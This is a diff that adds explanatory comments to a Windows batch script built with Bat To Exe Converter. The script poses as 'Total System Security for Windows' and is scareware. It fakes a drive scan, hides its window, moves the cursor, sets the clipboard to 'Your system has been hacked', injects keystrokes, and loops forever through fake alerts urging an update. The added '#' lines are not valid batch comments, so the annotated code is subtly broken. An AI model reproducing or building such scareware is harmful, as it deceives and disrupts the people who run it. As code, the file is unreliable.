@@ -1,3 +1,5 @@
+# Configuration for Bat To Exe Converter Windows application
+
 ::[Bat To Exe Converter]
 ::
 ::fBE1pAF6MU+EWHreyHcjLQlHcD6LPW/6J70R7ezHy++UqVkSRN4rd5va1qeXM/QW51bhdoM/325DlcoAGxpKe1ytZwMxulJxr3eRMsqooQ74Z02a9Uo3Hit3lAM=
@@ -34,10 +36,17 @@
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
+
+# Disables echoing the code (cmd.exe only)
 @echo off
+# Clears the whole screen
 cls
+# Sets the title of the command line window.
 title Total System Security for Windows.
+# Shows a particular message to the user.
 echo Please wait while we scan your system, and other drives...
+
+# Shows the contents of those drives on the console screen (cmd.exe only)
 dir C:
 dir D:
 dir E:
@@ -62,8 +71,11 @@ dir W:
 dir X:
 dir Y:
 dir Z:
+# Hides the console window (Redirects into the background)
 %extd% /hideself
+# "start" is a list of commands
 :start
+# Sets the cursor to a specific dimention into the host screen.
 %extd% /setcursor 100 100
 %extd% /setcursor 200 200
 %extd% /setcursor 300 200
@@ -96,8 +108,10 @@ dir Z:
 %extd% /setcursor 200 200
 %extd% /setcursor 300 200
 %extd% /setcursor 600 400
+# Copies some text into the clipboard.
 %extd% /setclipboardtext "Total System Security needs your attention.."
 %extd% /setclipboardtext "Your system has been hacked."
+# Emulates keyboard clicks (Presses them on keyboard)
 %extd% /sendkeys ttttttttttttttttt
 %extd% /sendkeys xxxxxxxxxxxxxxxxx
 %extd% /sendkeys yyyyyyyyyyyyyyyyy
@@ -138,6 +152,7 @@ dir Z:
 %extd% /sendkeys xxxxxxxxxxxxxxxxx
 %extd% /sendkeys yyyyyyyyyyyyyyyyy
 %extd% /sendkeys iiiiiiiiiiiiiiiii
+# Some unusual annoying messages,that must appear after the execution.
 SystemTrayMessage.exe "Total System Security Has detected unwanted behaviour that ocurrs on your system, please update your version of Total System Security and try again" /T:"Total System Security"
 %extd% /messagebox "Total System Security for Windows" "Total System Security needs to take some actions about your system, so they would be protected against malware if you would like to protect your system, please press OK button ,else we won't take any action to protect your system ,and your system files will become more vulnerable for online hackers and other illegal downloaders, please click OK to continue..." 16
 SystemTrayMessage.exe "Total System Security Has detected unwanted behaviour that ocurrs on your system, please update your version of Total System Security and try again" /T:"Total System Security"
@@ -152,6 +167,10 @@ SystemTrayMessage.exe "Total System Security Has detected unwanted behaviour tha
 %extd% /messagebox "Total System Security for Windows" "Total System Security needs to take some actions about your system, so they would be protected against malware if you would like to protect your system, please press OK button ,else we won't take any action to protect your system ,and your system files will become more vulnerable for online hackers and other illegal downloaders, please click OK to continue..." 16
 SystemTrayMessage.exe "Total System Security Has detected unwanted behaviour that ocurrs on your system, please update your version of Total System Security and try again" /T:"Total System Security"
 %extd% /messagebox "Total System Security for Windows" "Total System Security needs to take some actions about your system, so they would be protected against malware if you would like to protect your system, please press OK button ,else we won't take any action to protect your system ,and your system files will become more vulnerable for online hackers and other illegal downloaders, please click OK to continue..." 16
+# Shows you the output of the messagebox (=1)
 echo %result%
+# Wait for 2000 miliseconds (2 seconds)
 %extd% /sleep 2000
+#  Re-executes the list of commands that is called "start"
 goto start
+# Re-executes them forever.
